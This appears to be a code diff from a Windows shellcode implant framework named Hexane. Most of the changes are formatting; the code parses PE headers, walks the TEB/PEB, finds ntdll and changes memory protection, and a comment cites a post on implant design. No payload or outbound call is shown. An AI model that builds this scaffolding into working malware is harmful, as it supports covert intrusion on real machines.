@@ -15,8 +15,8 @@ namespace Memory {
 		PRESOURCE FindIntResource(HMODULE base, CONST INT rsrc_id) {
             HEXANE;
 
-            HRSRC rsrc_info		= { };
-            PRESOURCE object	= (RESOURCE*) Malloc(sizeof(_resource));
+            HRSRC rsrc_info	= { };
+            PRESOURCE object = (RESOURCE*)Malloc(sizeof(_resource));
 
             x_assert(rsrc_info          = ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
             x_assert(object->h_global   = ctx->win32.LoadResource(base, rsrc_info));
@@ -30,9 +30,9 @@ namespace Memory {
         VOID FindHeaders(EXECUTABLE *exe) {
             HEXANE;
 
-            exe->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(exe->buffer) + ((PIMAGE_DOS_HEADER)exe->buffer)->e_lfanew);
-            exe->symbols  = (PCOFF_SYMBOL) (B_PTR(exe->buffer) + exe->nt_head->FileHeader.PointerToSymbolTable);
-            exe->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+            exe->nt_head = (PIMAGE_NT_HEADERS) (B_PTR(exe->buffer) + ((PIMAGE_DOS_HEADER)exe->buffer)->e_lfanew);
+            exe->symbols = (PCOFF_SYMBOL) (B_PTR(exe->buffer) + exe->nt_head->FileHeader.PointerToSymbolTable);
+            exe->exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
         }
     }
 
@@ -40,18 +40,18 @@ namespace Memory {
 
         BOOL ContextInit() {
             HEXANE;
-
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
+
             _hexane instance = { };
-			SIZE_T size   = sizeof(void*);
+			SIZE_T size = sizeof(void*);
 			ULONG protect = 0;
 
-            instance.teb    = NtCurrentTeb();
-            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
+            instance.teb = NtCurrentTeb();
+            instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
 
-            instance.teb->LastErrorValue    = ERROR_SUCCESS;
-            instance.base.address           = U_PTR(InstStart());
-            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
+            instance.teb->LastErrorValue = ERROR_SUCCESS;
+            instance.base.address = U_PTR(InstStart());
+            instance.base.size = U_PTR(InstEnd()) - instance.base.address;
 
             if (!(instance.modules.ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase)) {
                 return false;
@@ -64,8 +64,8 @@ namespace Memory {
                 return false;
             }
 
-            void *global = (LPVOID) instance.base.address + U_PTR(&__global);
-			void *glob_a = global;
+            VOID *global = RVA(LPVOID, instance.base.address, &__global);
+			VOID *glob_a = global;
 
 			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &glob_a, &size, PAGE_READWRITE, &protect)) ||
 				!(C_DREF(global) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
